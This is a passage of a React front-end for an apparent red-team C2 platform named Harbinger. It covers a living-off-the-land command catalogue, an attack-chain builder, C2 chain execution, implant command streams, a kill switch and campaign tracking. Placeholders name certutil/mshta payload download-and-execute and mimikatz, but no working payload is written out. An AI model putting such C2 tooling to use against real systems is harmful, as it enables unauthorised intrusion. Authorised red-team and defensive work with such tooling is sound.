  const handleSearch = useCallback((q: string) => {
    setSearchQ(q)
    if (q.trim()) {
      searchEntries(q)
    }
  }, [searchEntries])

  const displayEntries = searchQ.trim() ? searchResults : entries

  return (
    <div className="grid grid-cols-1 xl:grid-cols-4 gap-6">
      {/* Left: Projects sidebar */}
      <div className="xl:col-span-1 space-y-3">
        <h3 className="font-semibold text-sm flex items-center gap-2">
          <Globe className="w-4 h-4 text-[#f0c040]" />
          LOL Projects ({projects.length})
        </h3>
        <div className="space-y-1 max-h-[70vh] overflow-y-auto pr-1">
          <button onClick={() => { setFilter('selectedProject', ''); fetchEntries() }}
            className={`w-full text-left px-3 py-2 rounded-lg text-xs transition-colors ${!selectedProject ? 'bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30' : 'text-text-secondary hover:text-text-primary hover:bg-surface-light'}`}>
            All Projects
          </button>
          {projects.map(p => (
            <button key={p.id} onClick={() => setFilter('selectedProject', p.id)}
              className={`w-full text-left px-3 py-2 rounded-lg text-xs transition-colors flex items-center justify-between ${
                selectedProject === p.id ? 'bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30' : 'text-text-secondary hover:text-text-primary hover:bg-surface-light'
              }`}>
              <div className="flex items-center gap-2 min-w-0">
                <span className={`px-1.5 py-0.5 rounded text-[10px] border ${PLATFORM_COLORS[p.platform] || 'bg-gray-600/20 text-gray-400 border-gray-500/30'}`}>{p.platform}</span>
                <span className="truncate">{p.shortName}</span>
              </div>
              <span className="text-[10px] text-text-secondary flex-shrink-0">{p.entryCount}</span>
            </button>
          ))}
        </div>

        {/* Platform filter */}
        <div className="pt-3 border-t border-border">
          <h4 className="text-xs text-text-secondary mb-2">Platform Filter</h4>
          <div className="flex flex-wrap gap-1">
            {['windows', 'linux', 'macos', 'ad', 'cross', 'esxi'].map(pl => (
              <button key={pl} onClick={() => setFilter('selectedPlatform', selectedPlatform === pl ? '' : pl)}
                className={`px-2 py-1 rounded text-[10px] border transition-colors ${
                  selectedPlatform === pl ? PLATFORM_COLORS[pl] : 'text-text-secondary border-border hover:text-text-primary'
                }`}>{pl}</button>
            ))}
          </div>
        </div>

        {/* Stats */}
        {stats && (
          <div className="pt-3 border-t border-border">
            <h4 className="text-xs text-text-secondary mb-2">MITRE Coverage</h4>
            <div className="space-y-1">
              {Object.entries(stats.mitreHeatmap).sort((a, b) => b[1] - a[1]).slice(0, 8).map(([id, count]) => (
                <div key={id} className="flex items-center justify-between text-xs">
                  <span className="text-[#00d4ff] font-mono">{id}</span>
                  <div className="flex items-center gap-2">
                    <div className="w-16 h-1.5 bg-surface-light rounded-full overflow-hidden">
                      <div className="h-full bg-[#f0c040] rounded-full" style={{ width: `${Math.min(100, (count / Math.max(...Object.values(stats.mitreHeatmap))) * 100)}%` }} />
                    </div>
                    <span className="text-text-secondary w-4 text-right">{count}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Right: Entries browser */}
      <div className="xl:col-span-3">
        {/* Search */}
        <div className="flex gap-2 mb-4">
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-text-secondary" />
            <input value={searchQ} onChange={e => handleSearch(e.target.value)}
              className="w-full bg-surface-light border border-border rounded-lg pl-10 pr-3 py-2 text-sm"
              placeholder="Search LOL entries — certutil, mimikatz, reverse shell, T1059..."
            />
          </div>
          <button onClick={() => { setSearchQ(''); fetchEntries() }} className="px-3 py-2 bg-surface-light border border-border rounded-lg text-sm text-text-secondary hover:text-text-primary">
            <RefreshCw className="w-4 h-4" />
          </button>
        </div>

        {/* Entries list */}
        <div className="space-y-2 max-h-[70vh] overflow-y-auto pr-1">
          {displayEntries.length === 0 && (
            <div className="bg-surface rounded-xl border border-border p-8 text-center text-text-secondary">
              <Skull className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p className="text-sm">No entries found. Try a different search or filter.</p>
            </div>
          )}
          {displayEntries.map(entry => (
            <div key={entry.id} className="bg-surface rounded-xl border border-border overflow-hidden">
              <button onClick={() => setExpandedEntry(expandedEntry === entry.id ? null : entry.id)}
                className="w-full text-left p-3 flex items-center gap-3 hover:bg-surface-light/50 transition-colors">
                {expandedEntry === entry.id ? <ChevronDown className="w-4 h-4 text-[#f0c040] flex-shrink-0" /> : <ChevronRight className="w-4 h-4 text-text-secondary flex-shrink-0" />}
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="font-medium text-sm font-mono text-[#f0c040]">{entry.name}</span>
                    <span className={`px-1.5 py-0.5 rounded text-[10px] border ${PLATFORM_COLORS[entry.platform] || 'bg-gray-600/20 text-gray-400 border-gray-500/30'}`}>{entry.platform}</span>
                    <span className="text-[10px] text-text-secondary bg-surface-light px-1.5 py-0.5 rounded">{entry.projectId}</span>
                    {entry.mitreIds.map(m => (
                      <span key={m} className="text-[10px] text-[#00d4ff] bg-[#00d4ff]/10 border border-[#00d4ff]/20 px-1.5 py-0.5 rounded font-mono">{m}</span>
                    ))}
                  </div>
                  <p className="text-xs text-text-secondary mt-1 truncate">{entry.description}</p>
                </div>
                <span className="text-xs text-text-secondary flex-shrink-0">{entry.commands.length} cmd{entry.commands.length !== 1 ? 's' : ''}</span>
              </button>

              {/* Expanded details */}
              <AnimatePresence>
                {expandedEntry === entry.id && (
                  <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="border-t border-border">
                    <div className="p-4 space-y-3">
                      {/* Commands */}
                      {entry.commands.map((cmd, i) => (
                        <div key={i} className="bg-[#0a0a0f] rounded-lg p-3 border border-border">
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-xs text-text-secondary">{cmd.description}</span>
                            <div className="flex items-center gap-2">
                              {cmd.privileges && <span className="text-[10px] text-yellow-400 bg-yellow-600/10 px-1.5 py-0.5 rounded border border-yellow-500/20">{cmd.privileges}</span>}
                              {cmd.mitreId && <span className="text-[10px] text-[#00d4ff] font-mono">{cmd.mitreId}</span>}
                              <button onClick={() => navigator.clipboard.writeText(cmd.command)} className="p-1 text-text-secondary hover:text-text-primary" title="Copy command">
                                <Copy className="w-3 h-3" />
                              </button>
                            </div>
                          </div>
                          <pre className="text-xs font-mono text-green-400 whitespace-pre-wrap break-all">{cmd.command}</pre>
                        </div>
                      ))}

                      {/* Tags & paths */}
                      <div className="flex flex-wrap gap-2">
                        {entry.tags.map(t => (
                          <span key={t} className="text-[10px] px-2 py-0.5 rounded-full bg-surface-light text-text-secondary border border-border">{t}</span>
                        ))}
                      </div>
                      {entry.paths && entry.paths.length > 0 && (
                        <div className="text-xs text-text-secondary">
                          <span className="text-text-primary">Paths: </span>
                          {entry.paths.map((p, i) => <code key={i} className="font-mono text-[#f0c040] mr-2">{p}</code>)}
                        </div>
                      )}

                      {/* Detection */}
                      {entry.detection && entry.detection.length > 0 && (
                        <div className="text-xs">
                          <span className="text-text-primary">Detection: </span>
                          {entry.detection.map((d, i) => (
                            <span key={i} className="text-red-400 mr-2">[{d.type}] {d.name || d.value}</span>
                          ))}
                        </div>
                      )}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

// ---- LOL Chains Tab ----

function LOLChainsTab() {
  const { chains, entries, fetchChains, createChain, deleteChain } = useLOLStore()
  const { chains: c2Chains, createChain: createC2Chain, executeChain: executeC2Chain, fetchChains: fetchC2Chains } = useC2Store()
  const [showCreate, setShowCreate] = useState(false)
  const [newChain, setNewChain] = useState({ name: '', description: '', platform: 'windows' })
  const [selectedEntries, setSelectedEntries] = useState<string[]>([])

  useEffect(() => {
    fetchChains()
    fetchC2Chains()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const handleCreateChain = () => {
    const steps = selectedEntries.map((entryId, i) => {
      const entry = entries.find(e => e.id === entryId)
      return {
        order: i + 1,
        entryId,
        entryName: entry?.name || entryId,
        projectId: entry?.projectId || '',
        commandIdx: 0,
        description: entry?.description || '',
        mitreId: entry?.mitreIds?.[0] || '',
        tactic: entry?.category || '',
      }
    })
    createChain({ ...newChain, steps, mitreTactics: [] })
    setShowCreate(false)
    setNewChain({ name: '', description: '', platform: 'windows' })
    setSelectedEntries([])
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h3 className="font-semibold flex items-center gap-2">
            <Link2 className="w-4 h-4 text-[#f0c040]" />
            Attack Chains
          </h3>
          <p className="text-xs text-text-secondary mt-1">Build LOL attack chains from catalog entries and C2 operations</p>
        </div>
        <button onClick={() => setShowCreate(true)}
          className="flex items-center gap-1.5 px-3 py-1.5 bg-[#f0c040]/20 hover:bg-[#f0c040]/30 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-sm">
          <Plus className="w-3.5 h-3.5" /> Build Chain
        </button>
      </div>

      {/* LOL Chains */}
      <div className="space-y-3">
        <h4 className="text-sm font-medium text-text-secondary">LOL Attack Chains ({chains.length})</h4>
        {chains.length === 0 && (
          <div className="bg-surface rounded-xl border border-border p-6 text-center text-text-secondary text-sm">
            No LOL chains created. Click "Build Chain" to compose LOL entries into an attack sequence.
          </div>
        )}
        {chains.map(ch => (
          <div key={ch.id} className="bg-surface rounded-xl border border-border p-4">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Link2 className="w-4 h-4 text-[#f0c040]" />
                <span className="font-medium">{ch.name}</span>
                <span className={`px-1.5 py-0.5 rounded text-[10px] border ${PLATFORM_COLORS[ch.platform] || 'bg-gray-600/20 text-gray-400 border-gray-500/30'}`}>{ch.platform}</span>
              </div>
              <div className="flex gap-2">
                <button onClick={() => deleteChain(ch.id)} className="p-1 text-red-400 hover:bg-red-600/20 rounded"><Trash2 className="w-3.5 h-3.5" /></button>
              </div>
            </div>
            {ch.description && <p className="text-xs text-text-secondary mb-3">{ch.description}</p>}
            {/* Steps visualization */}
            <div className="flex items-center gap-1 overflow-x-auto pb-1">
              {ch.steps.map((step, i) => (
                <div key={i} className="flex items-center gap-1 flex-shrink-0">
                  <div className="bg-[#0a0a0f] border border-border rounded-lg px-3 py-2 text-xs">
                    <span className="text-[#f0c040] font-mono">{step.entryName}</span>
                    {step.mitreId && <span className="text-[#00d4ff] ml-1 text-[10px]">{step.mitreId}</span>}
                  </div>
                  {i < ch.steps.length - 1 && <ChevronRight className="w-3 h-3 text-text-secondary flex-shrink-0" />}
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* C2 Attack Chains */}
      <div className="space-y-3">
        <h4 className="text-sm font-medium text-text-secondary">C2 Attack Chains ({c2Chains.length})</h4>
        {c2Chains.map(ch => (
          <div key={ch.id} className="bg-surface rounded-xl border border-border p-4">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Crosshair className="w-4 h-4 text-red-400" />
                <span className="font-medium">{ch.name}</span>
                <StatusBadge status={ch.status} />
              </div>
              {ch.status === 'pending' && (
                <button onClick={() => executeC2Chain(ch.id)} className="flex items-center gap-1 px-2 py-1 text-xs bg-green-600/20 text-green-400 border border-green-500/30 rounded">
                  <Play className="w-3 h-3" /> Execute
                </button>
              )}
            </div>
            <div className="space-y-1">
              {ch.steps.map((step, i) => (
                <div key={step.id} className="flex items-center gap-2 text-xs">
                  <span className="text-text-secondary w-4">{i + 1}.</span>
                  <StatusBadge status={step.status} />
                  <span className={step.type === 'lolbin' ? 'text-[#f0c040]' : 'text-text-primary'}>{step.name}</span>
                  {step.mitreId && <span className="text-[#00d4ff] font-mono text-[10px]">{step.mitreId}</span>}
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* Chain Builder Modal */}
      <AnimatePresence>
        {showCreate && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center" onClick={() => setShowCreate(false)}>
            <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-surface border border-border rounded-xl p-6 w-full max-w-2xl max-h-[80vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
              <h3 className="font-semibold text-lg mb-4">Build Attack Chain</h3>
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-3">
                  <div><label className="text-sm text-text-secondary block mb-1">Chain Name</label><input value={newChain.name} onChange={e => setNewChain({...newChain, name: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="LOLBin Download & Execute" /></div>
                  <div><label className="text-sm text-text-secondary block mb-1">Platform</label>
                    <select value={newChain.platform} onChange={e => setNewChain({...newChain, platform: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                      <option value="windows">Windows</option><option value="linux">Linux</option><option value="macos">macOS</option><option value="ad">Active Directory</option><option value="cross">Cross-Platform</option>
                    </select>
                  </div>
                </div>
                <div><label className="text-sm text-text-secondary block mb-1">Description</label><input value={newChain.description} onChange={e => setNewChain({...newChain, description: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="Download payload via certutil, execute via mshta" /></div>

                {/* Selected entries */}
                <div>
                  <label className="text-sm text-text-secondary block mb-2">Chain Steps ({selectedEntries.length})</label>
                  <div className="space-y-1 mb-3">
                    {selectedEntries.map((id, i) => {
                      const entry = entries.find(e => e.id === id)
                      return (
                        <div key={i} className="flex items-center gap-2 bg-[#0a0a0f] p-2 rounded-lg border border-border">
                          <span className="text-xs text-text-secondary w-4">{i + 1}.</span>
                          <span className="text-xs text-[#f0c040] font-mono flex-1">{entry?.name || id}</span>
                          <button onClick={() => setSelectedEntries(selectedEntries.filter((_, j) => j !== i))} className="text-red-400 hover:text-red-300"><X className="w-3 h-3" /></button>
                        </div>
                      )
                    })}
                  </div>

                  {/* Available entries */}
                  <div className="bg-surface-light rounded-lg border border-border p-2 max-h-48 overflow-y-auto">
                    <p className="text-[10px] text-text-secondary mb-2">Click to add to chain:</p>
                    <div className="space-y-0.5">
                      {entries.filter(e => !selectedEntries.includes(e.id)).slice(0, 30).map(e => (
                        <button key={e.id} onClick={() => setSelectedEntries([...selectedEntries, e.id])}
                          className="w-full text-left px-2 py-1.5 rounded text-xs hover:bg-surface transition-colors flex items-center gap-2">
                          <Plus className="w-3 h-3 text-green-400" />
                          <span className="font-mono text-[#f0c040]">{e.name}</span>
                          <span className="text-text-secondary">{e.projectId}</span>
                          <span className={`px-1 py-0.5 rounded text-[9px] border ${PLATFORM_COLORS[e.platform] || ''}`}>{e.platform}</span>
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="flex gap-2 justify-end pt-2">
                  <button onClick={() => setShowCreate(false)} className="px-4 py-2 text-sm text-text-secondary">Cancel</button>
                  <button onClick={handleCreateChain} disabled={!newChain.name || selectedEntries.length === 0}
                    className="px-4 py-2 text-sm bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg hover:bg-[#f0c040]/30 disabled:opacity-50 disabled:cursor-not-allowed">
                    Create Chain
                  </button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

// ---- Live Dashboard Tab ----

function LiveDashboardTab() {
  const { agentStatuses, streams, operators, killSwitch, events, fetchAgentStatuses, fetchStreams, fetchOperators, fetchEvents, toggleKillSwitch } = useRealtimeStore()
  const { pendingCount } = useSafetyStore()
  const [consoleOutput, setConsoleOutput] = useState<string[]>([
    '[00:00.0] SYSTEM  Harbinger Red Team C2 — Live Dashboard initialized',
    '[00:00.1] SYSTEM  Waiting for agent activity...',
  ])

  useEffect(() => {
    fetchAgentStatuses()
    fetchStreams()
    fetchOperators()
    fetchEvents({ limit: 50 })
    const interval = setInterval(() => {
      fetchAgentStatuses()
      fetchStreams({ status: 'executing' })
      fetchEvents({ limit: 50 })
    }, 5000)
    return () => clearInterval(interval)
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const statusColors: Record<string, string> = {
    idle: 'text-gray-400',
    executing: 'text-green-400',
    waiting: 'text-yellow-400',
    error: 'text-red-400',
  }

  const activeAgents = agentStatuses.filter(a => a.status === 'executing').length
  const activeStreams = streams.filter(s => s.status === 'executing').length

  return (
    <div className="space-y-4">
      {/* Kill Switch Banner */}
      {killSwitch?.active && (
        <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            <div>
              <span className="text-red-400 font-bold">KILL SWITCH ACTIVE</span>
              <span className="text-red-400/60 text-sm ml-2">All operations halted</span>
            </div>
          </div>
          <button onClick={() => toggleKillSwitch(false)} className="px-4 py-1.5 bg-red-500/20 border border-red-500/30 rounded-lg text-sm text-red-400 hover:bg-red-500/30">
            Deactivate
          </button>
        </div>
      )}

      {/* Quick Stats */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
        {[
          { label: 'Active Agents', value: activeAgents, total: agentStatuses.length, color: 'text-green-400' },
          { label: 'Live Streams', value: activeStreams, total: streams.length, color: 'text-[#00d4ff]' },
          { label: 'Operators Online', value: operators.length, total: null, color: 'text-[#f0c040]' },
          { label: 'Pending Approvals', value: pendingCount, total: null, color: pendingCount > 0 ? 'text-red-400' : 'text-gray-400' },
          { label: 'Recent Events', value: events.length, total: null, color: 'text-[#a78bfa]' },
        ].map(s => (
          <div key={s.label} className="bg-surface rounded-xl border border-border p-3">
            <div className="text-xs text-text-secondary mb-1">{s.label}</div>
            <div className={`text-xl font-bold font-mono ${s.color}`}>
              {s.value}{s.total !== null && <span className="text-text-secondary text-sm">/{s.total}</span>}
            </div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Agent Status Grid */}
        <div className="bg-surface rounded-xl border border-border p-4">
          <div className="flex items-center justify-between mb-3">
            <h3 className="font-semibold text-sm">Agent Status</h3>
            <button onClick={() => fetchAgentStatuses()} className="text-text-secondary hover:text-white">
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
          {agentStatuses.length === 0 ? (
            <div className="text-center py-6 text-text-secondary text-sm">No agents reporting. Agents will appear when they start heartbeating.</div>
          ) : (
            <div className="space-y-2">
              {agentStatuses.map(agent => (
                <div key={agent.agentId} className="flex items-center justify-between p-2 bg-surface-light rounded-lg border border-border">
                  <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${agent.status === 'executing' ? 'bg-green-400 animate-pulse' : agent.status === 'error' ? 'bg-red-400' : 'bg-gray-500'}`} />
                    <span className="font-mono text-sm">{agent.agentName || agent.agentId}</span>
                  </div>
                  <div className="flex items-center gap-3">
                    {agent.currentTask && <span className="text-xs text-text-secondary truncate max-w-[150px]">{agent.currentTask}</span>}
                    <span className={`text-xs font-mono ${statusColors[agent.status] || 'text-gray-400'}`}>{agent.status.toUpperCase()}</span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Command Streams */}
        <div className="bg-surface rounded-xl border border-border p-4">
          <div className="flex items-center justify-between mb-3">
            <h3 className="font-semibold text-sm">Active Command Streams</h3>
            <button onClick={() => fetchStreams()} className="text-text-secondary hover:text-white">
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
          {streams.length === 0 ? (
            <div className="text-center py-6 text-text-secondary text-sm">No active streams. Commands will appear when executed.</div>
          ) : (
            <div className="space-y-2 max-h-[300px] overflow-y-auto">
              {streams.slice(0, 20).map(stream => (
                <div key={stream.id} className="p-2 bg-surface-light rounded-lg border border-border">
                  <div className="flex items-center justify-between mb-1">
                    <span className="font-mono text-xs text-[#00d4ff]">{stream.implantId}</span>
                    <span className={`text-xs font-mono ${stream.status === 'executing' ? 'text-green-400' : stream.status === 'completed' ? 'text-[#f0c040]' : stream.status === 'failed' ? 'text-red-400' : 'text-gray-400'}`}>
                      {stream.status}
                    </span>
                  </div>
                  <div className="font-mono text-xs text-text-secondary truncate">{stream.command}</div>
                  {stream.output && (
                    <pre className="mt-1 text-[10px] text-green-400/70 font-mono bg-black/30 rounded p-1 max-h-[60px] overflow-y-auto whitespace-pre-wrap">{stream.output.slice(-200)}</pre>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Operators & Real-time Console */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Operators */}
        <div className="bg-surface rounded-xl border border-border p-4">
          <h3 className="font-semibold text-sm mb-3">Active Operators</h3>
          {operators.length === 0 ? (
            <div className="text-center py-4 text-text-secondary text-sm">No operators connected</div>
          ) : (
            <div className="space-y-2">
              {operators.map(op => (
                <div key={op.id} className="flex items-center justify-between p-2 bg-surface-light rounded-lg border border-border">
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-[#f0c040]/20 border border-[#f0c040]/30 flex items-center justify-center text-[10px] font-bold text-[#f0c040]">
                      {op.username.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <div className="text-sm font-mono">{op.username}</div>
                      <div className="text-[10px] text-text-secondary">{op.role}</div>
                    </div>
                  </div>
                  <div className="text-[10px] text-text-secondary">{op.currentView || 'idle'}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Real-time Console */}
        <div className="lg:col-span-2 bg-surface rounded-xl border border-border overflow-hidden">
          <div className="flex items-center gap-1.5 px-3 py-2 bg-surface-light border-b border-border">
            <div className="w-2.5 h-2.5 rounded-full bg-red-400" />
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-400" />
            <div className="w-2.5 h-2.5 rounded-full bg-green-400" />
            <span className="ml-2 text-[11px] font-mono text-text-secondary">harbinger — real-time event feed</span>
          </div>
          <div className="p-3 font-mono text-[11px] leading-[1.7] h-[200px] overflow-y-auto bg-black/20">
            {events.length === 0 ? (
              <div className="text-text-secondary">Waiting for events...</div>
            ) : (
              events.slice(0, 30).map((ev, i) => (
                <div key={ev.id || i}>
                  <span className="text-[#333]">{ev.timestamp?.slice(11, 19) || '00:00:00'}</span>{' '}
                  <span className={ev.type === 'system_alert' ? 'text-red-400' : ev.type === 'command_output' ? 'text-green-400' : ev.type === 'agent_status' ? 'text-[#00d4ff]' : 'text-[#f0c040]'}>
                    {ev.type?.toUpperCase().replace('_', ' ')}
                  </span>{' '}
                  <span className="text-[#888]">{ev.source} → {ev.target || '*'}</span>
                </div>
              ))
            )}
            {consoleOutput.map((line, i) => (
              <div key={`console-${i}`} className="text-[#555]">{line}</div>
            ))}
          </div>
        </div>
      </div>

      {/* Kill Switch + Quick Actions */}
      <div className="flex items-center gap-3 justify-end">
        <button
          onClick={() => toggleKillSwitch(!killSwitch?.active)}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all ${
            killSwitch?.active
              ? 'bg-green-500/20 border border-green-500/30 text-green-400 hover:bg-green-500/30'
              : 'bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30'
          }`}
        >
          {killSwitch?.active ? <Play className="w-4 h-4" /> : <Square className="w-4 h-4" />}
          {killSwitch?.active ? 'Resume All Operations' : 'KILL SWITCH — Halt All'}
        </button>
      </div>
    </div>
  )
}

// ---- Campaigns Tab ----

function CampaignsTab() {
  const { campaigns, fetchCampaigns, createCampaign, updateCampaign } = useLearningStore()
  const [showCreate, setShowCreate] = useState(false)
  const [newCampaign, setNewCampaign] = useState({ name: '', notes: '' })

  useEffect(() => {
    fetchCampaigns()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const statusColors: Record<string, string> = {
    planning: 'text-gray-400 border-gray-500/30 bg-gray-500/10',
    active: 'text-green-400 border-green-500/30 bg-green-500/10',
    paused: 'text-yellow-400 border-yellow-500/30 bg-yellow-500/10',
    completed: 'text-[#00d4ff] border-[#00d4ff]/30 bg-[#00d4ff]/10',
    failed: 'text-red-400 border-red-500/30 bg-red-500/10',
  }

  const handleCreate = async () => {
    if (!newCampaign.name) return
    await createCampaign({ name: newCampaign.name, notes: newCampaign.notes, status: 'planning' })
    setNewCampaign({ name: '', notes: '' })
    setShowCreate(false)
  }

  const activeCampaigns = campaigns.filter(c => c.status === 'active')
  const completedCampaigns = campaigns.filter(c => c.status === 'completed')

  return (
    <div className="space-y-4">
      {/* Campaign Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        {[
          { label: 'Total Campaigns', value: campaigns.length, color: 'text-white' },
          { label: 'Active', value: activeCampaigns.length, color: 'text-green-400' },
          { label: 'Completed', value: completedCampaigns.length, color: 'text-[#00d4ff]' },
          { label: 'Avg Success', value: campaigns.length > 0 ? Math.round(campaigns.reduce((sum, c) => sum + (c.successfulSteps / Math.max(c.totalSteps, 1)), 0) / campaigns.length * 100) + '%' : 'N/A', color: 'text-[#f0c040]' },
        ].map(s => (
          <div key={s.label} className="bg-surface rounded-xl border border-border p-3">
            <div className="text-xs text-text-secondary mb-1">{s.label}</div>
            <div className={`text-xl font-bold font-mono ${s.color}`}>{s.value}</div>
          </div>
        ))}
      </div>

      {/* Create + List */}
      <div className="flex items-center justify-between">
        <h3 className="font-semibold">Campaigns</h3>
        <button onClick={() => setShowCreate(!showCreate)} className="flex items-center gap-2 px-3 py-1.5 bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-sm hover:bg-[#f0c040]/30">
          <Plus className="w-3.5 h-3.5" /> New Campaign
        </button>
      </div>

      {showCreate && (
        <div className="bg-surface rounded-xl border border-border p-4 space-y-3">
          <input value={newCampaign.name} onChange={e => setNewCampaign({ ...newCampaign, name: e.target.value })} placeholder="Campaign name..."
            className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" />
          <textarea value={newCampaign.notes} onChange={e => setNewCampaign({ ...newCampaign, notes: e.target.value })} placeholder="Notes and objectives..."
            className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm h-20 resize-none" />
          <div className="flex gap-2 justify-end">
            <button onClick={() => setShowCreate(false)} className="px-3 py-1.5 text-sm text-text-secondary">Cancel</button>
            <button onClick={handleCreate} disabled={!newCampaign.name} className="px-4 py-1.5 text-sm bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg disabled:opacity-50">
              Launch Campaign
            </button>
          </div>
        </div>
      )}

      {/* Campaign List */}
      {campaigns.length === 0 ? (
        <div className="text-center py-12 text-text-secondary">
          <Crosshair className="w-10 h-10 mx-auto mb-3 opacity-30" />
          <p className="text-sm">No campaigns yet. Create one to start tracking adversary operations.</p>
        </div>
      ) : (
        <div className="space-y-3">
          {campaigns.map(campaign => (
            <div key={campaign.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-3">
                  <span className="font-semibold">{campaign.name}</span>
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${statusColors[campaign.status] || 'text-gray-400'}`}>
                    {campaign.status.toUpperCase()}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  {campaign.status === 'planning' && (
                    <button onClick={() => updateCampaign(campaign.id, { status: 'active' })} className="text-xs text-green-400 hover:text-green-300">
                      <Play className="w-3.5 h-3.5" />
                    </button>
                  )}
                  {campaign.status === 'active' && (
                    <button onClick={() => updateCampaign(campaign.id, { status: 'paused' })} className="text-xs text-yellow-400 hover:text-yellow-300">
                      <Square className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>
              </div>

              {/* Progress bar */}
              <div className="w-full bg-surface-light rounded-full h-2 mb-2">
                <div className="bg-[#f0c040] h-2 rounded-full transition-all" style={{ width: `${campaign.progressPercent || 0}%` }} />
              </div>

              <div className="flex items-center gap-4 text-xs text-text-secondary">
                <span className="text-green-400">{campaign.successfulSteps} passed</span>
                <span className="text-red-400">{campaign.failedSteps} failed</span>
                <span className="text-yellow-400">{campaign.detectedSteps} detected</span>
                <span>{campaign.totalSteps} total steps</span>
                {campaign.techniquesUsed?.length > 0 && <span className="text-[#00d4ff]">{campaign.techniquesUsed.length} techniques</span>}
              </div>

              {/* Timeline preview */}
              {campaign.timeline && campaign.timeline.length > 0 && (
                <div className="mt-3 space-y-1 max-h-[100px] overflow-y-auto">
                  {campaign.timeline.slice(-5).map((ev, i) => (
                    <div key={i} className="flex items-center gap-2 text-[10px] font-mono">
                      <span className="text-[#333]">{ev.timestamp?.slice(11, 19) || '—'}</span>
                      <span className={ev.eventType === 'step_completed' ? 'text-green-400' : ev.eventType === 'step_failed' ? 'text-red-400' : ev.eventType === 'detection_alert' ? 'text-yellow-400' : 'text-[#888]'}>
                        {ev.eventType?.replace('_', ' ').toUpperCase()}
                      </span>
                      <span className="text-text-secondary">{ev.details}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// ---- Learning Tab ----

function LearningTab() {
  const { dashboard, techniqueScores, recommendations, agentPerformance, discoveries, fetchDashboard, fetchTechniqueScores, fetchRecommendations, fetchAgentPerformance, fetchDiscoveries, generateRecommendations, dismissRecommendation } = useLearningStore()
  const [subTab, setSubTab] = useState<'overview' | 'techniques' | 'agents' | 'recommendations' | 'discoveries'>('overview')

  useEffect(() => {
    fetchDashboard()
    fetchTechniqueScores()
    fetchRecommendations()
    fetchAgentPerformance()
    fetchDiscoveries()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <div className="space-y-4">
      {/* Sub-tabs */}
      <div className="flex gap-1 bg-surface-light border border-border rounded-lg p-1">
        {(['overview', 'techniques', 'agents', 'recommendations', 'discoveries'] as const).map(t => (
          <button key={t} onClick={() => setSubTab(t)}
